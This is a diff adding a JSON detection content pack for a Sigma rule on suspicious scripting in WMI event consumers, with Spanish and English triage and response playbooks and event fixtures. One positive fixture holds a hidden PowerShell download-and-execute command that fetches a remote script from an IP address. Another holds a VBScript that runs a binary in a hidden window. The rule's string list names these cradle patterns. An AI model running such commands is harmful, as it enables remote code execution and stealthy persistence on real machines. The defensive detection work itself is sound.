@@ -1,0 +1,132 @@
+{
+  "rule": {
+    "id": "fe21810c-2a8c-478f-8dd3-5a287fb2a0e0",
+    "title": "Suspicious Scripting in a WMI Consumer",
+    "level": "high",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems), Jonhnathan Ribeiro",
+    "path": "windows/wmi_event/sysmon_wmi_susp_scripting.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/wmi_event/sysmon_wmi_susp_scripting.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.005"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se creó o modificó un consumidor de eventos WMI cuyo campo Destination contiene comandos de PowerShell o scripting sospechosos (descargas, IEX, codificación Base64 o WScript.Shell). Es un patrón típico de persistencia mediante suscripciones WMI.",
+      "what_it_detects": "Eventos Sysmon de consumidores WMI (Event ID 20) donde Destination incluye Net.WebClient con DownloadString/DownloadFile, ' iex(', ' -nop ', ' -noprofile ', ' -enc ', ' -decode ', WScript.Shell o FromBase64Transform.",
+      "why_it_matters": "Las suscripciones WMI (filtro, consumidor y binding) ejecutan código automáticamente ante un evento, como el arranque o un intervalo, sin archivos visibles en carpetas de inicio. Corresponde a ejecución mediante intérpretes de scripts (T1059.005, Visual Basic) y suele usarse para persistencia sigilosa.",
+      "triage_steps": [
+        "Revise Destination, Type (Command Line o Script), Name, Operation y User del evento; decodifique cualquier cadena Base64 o -enc para conocer el payload real.",
+        "Busque en el mismo host, +/- 15 minutos, los Event ID 19 (filtro WMI, campo Query) y 21 (binding) para reconstruir la suscripción completa y su disparador.",
+        "Identifique el proceso que creó la suscripción (powershell.exe, wmic.exe, mofcomp.exe o un acceso remoto por WinRM/DCOM) y su proceso padre.",
+        "Busque procesos hijos de WmiPrvSE.exe o scmrcons.exe en el host para comprobar si el consumidor ya se ejecutó.",
+        "Extraiga URLs o IPs del Destination y revise logs de proxy, DNS y firewall para conexiones salientes desde el host.",
+        "Compruebe si la cuenta en User es administrativa, si el cambio estaba autorizado y si hay alertas previas para el mismo host o usuario."
+      ],
+      "false_positives": [
+        "Scripts administrativos legítimos que registran consumidores WMI para monitoreo o mantenimiento con PowerShell -NoProfile.",
+        "Herramientas de gestión de endpoints, inventario o backup que crean suscripciones WMI con scripts VBScript que usan WScript.Shell.",
+        "Ejercicios autorizados de red team o pruebas de detección."
+      ],
+      "response_steps": [
+        "Verifique con el responsable del host o el equipo de TI si la suscripción es conocida y está documentada.",
+        "Si es maliciosa, aísle el endpoint y exporte el filtro, consumidor y binding (Get-CimInstance -Namespace root\\subscription) como evidencia.",
+        "Elimine el binding, el consumidor y el filtro con Remove-CimInstance solo después de preservar la evidencia.",
+        "Bloquee las URLs o IPs identificadas, restablezca las credenciales de la cuenta usada y busque la misma suscripción en otros hosts."
+      ],
+      "severity_rationale": "Es alta porque las cadenas detectadas en consumidores WMI casi nunca aparecen en uso legítimo y suelen indicar persistencia activa con ejecución de código."
+    },
+    "en": {
+      "summary": "A WMI event consumer was created or modified whose Destination contains suspicious PowerShell or scripting content (downloads, IEX, Base64 encoding or WScript.Shell). This is a common WMI subscription persistence pattern.",
+      "what_it_detects": "Sysmon WMI consumer events (Event ID 20) where Destination includes Net.WebClient with DownloadString/DownloadFile, ' iex(', ' -nop ', ' -noprofile ', ' -enc ', ' -decode ', WScript.Shell or FromBase64Transform.",
+      "why_it_matters": "WMI subscriptions (filter, consumer, binding) run code automatically on a trigger such as boot or a timer, without visible startup entries. This maps to script interpreter execution (T1059.005, Visual Basic) and stealthy persistence.",
+      "triage_steps": [
+        "Review Destination, Type (Command Line or Script), Name, Operation and User; decode any Base64 or -enc string to reveal the real payload.",
+        "On the same host within +/- 15 minutes, find Event ID 19 (filter, Query field) and Event ID 21 (binding) to rebuild the full subscription and its trigger.",
+        "Identify the process that created the subscription (powershell.exe, wmic.exe, mofcomp.exe or remote WinRM/DCOM) and its parent.",
+        "Look for child processes of WmiPrvSE.exe or scmrcons.exe on the host to see whether the consumer has already fired.",
+        "Extract URLs or IPs from Destination and check proxy, DNS and firewall logs for outbound connections from the host.",
+        "Check whether the User account is administrative, whether the change was authorized, and any earlier alerts for the same host or user."
+      ],
+      "false_positives": [
+        "Legitimate administrative scripts registering WMI consumers for monitoring or maintenance using PowerShell -NoProfile.",
+        "Endpoint management, inventory or backup tools creating WMI subscriptions with VBScript that uses WScript.Shell.",
+        "Authorized red team exercises or detection testing."
+      ],
+      "response_steps": [
+        "Confirm with the host owner or IT whether the subscription is known and documented.",
+        "If malicious, isolate the endpoint and export the filter, consumer and binding (Get-CimInstance -Namespace root\\subscription) as evidence.",
+        "Remove the binding, consumer and filter with Remove-CimInstance only after evidence is preserved.",
+        "Block identified URLs or IPs, reset credentials of the account used, and hunt for the same subscription on other hosts."
+      ],
+      "severity_rationale": "High because these strings in WMI consumers are rarely legitimate and usually indicate active persistence with code execution."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "CommandLineEventConsumer launching hidden PowerShell with -nop that downloads and runs a remote script",
+        "event": {
+          "EventID": 20,
+          "EventType": "WmiConsumerEvent",
+          "Operation": "Created",
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Name": "\"SysUpdater\"",
+          "Type": "Command Line",
+          "Destination": "\"powershell.exe -nop -w hidden -c IEX ((New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1'))\""
+        }
+      },
+      {
+        "description": "ActiveScriptEventConsumer with VBScript using WScript.Shell to run a binary",
+        "event": {
+          "EventID": 20,
+          "EventType": "WmiConsumerEvent",
+          "Operation": "Created",
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\admin.mrojas",
+          "Name": "\"WinHealthCheck\"",
+          "Type": "Script",
+          "Destination": "\"Set objShell = CreateObject(\"WScript.Shell\") : objShell.Run \"C:\\ProgramData\\upd.exe\", 0\""
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate consumer running a local VBScript via cscript without suspicious strings",
+        "event": {
+          "EventID": 20,
+          "EventType": "WmiConsumerEvent",
+          "Operation": "Created",
+          "Computer": "SRV-FS-01.andes.example.com",
+          "User": "ANDES\\svc.monitoring",
+          "Name": "\"DiskSpaceAlert\"",
+          "Type": "Command Line",
+          "Destination": "\"C:\\Windows\\System32\\cscript.exe C:\\Scripts\\disk_alert.vbs\""
+        }
+      },
+      {
+        "description": "Consumer running a local PowerShell file with -NoLogo and -File, no download, encoding or -nop flags",
+        "event": {
+          "EventID": 20,
+          "EventType": "WmiConsumerEvent",
+          "Operation": "Created",
+          "Computer": "SRV-APP-03.andes.example.com",
+          "User": "ANDES\\svc.inventory",
+          "Name": "\"InventoryCollector\"",
+          "Type": "Command Line",
+          "Destination": "\"powershell.exe -NoLogo -File C:\\Scripts\\inventory.ps1\""
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:13+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
